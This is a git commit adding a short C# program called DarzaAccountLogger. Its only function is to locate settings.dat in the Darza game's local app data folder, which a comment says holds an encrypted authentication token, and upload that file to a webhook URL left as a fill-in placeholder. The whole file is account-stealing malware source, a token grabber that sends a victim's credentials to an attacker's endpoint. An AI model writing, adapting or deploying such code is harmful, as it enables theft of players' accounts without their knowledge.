f13c21be0b745dcf35a59e6b682571f6886af09d
hhartleyqq@gmail.com <hhartleyqq@gmail.com>
2022-05-11 15:58:03 +0100

    Add project files.

---
+++ DarzaAccountLogger/Program.cs
@@ -0,0 +1,25 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+using System.Net;
+
+namespace DarzaAccountLogger
+{
+    class Program
+    {
+        static string webhook = "YOUR_WEBHOOK_HERE";
+        static void Main(string[] args)
+        {
+            //gets settings.dat in Local/RippleStudio/Darza, which contains an encrypted authentication token
+            var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "RippleStudio", "Darza");
+
+            using (WebClient client = new WebClient())
+            {
+                client.UploadFile(webhook, Path.Combine(path, "settings.dat"));
+            }
+        }
+    }
+}
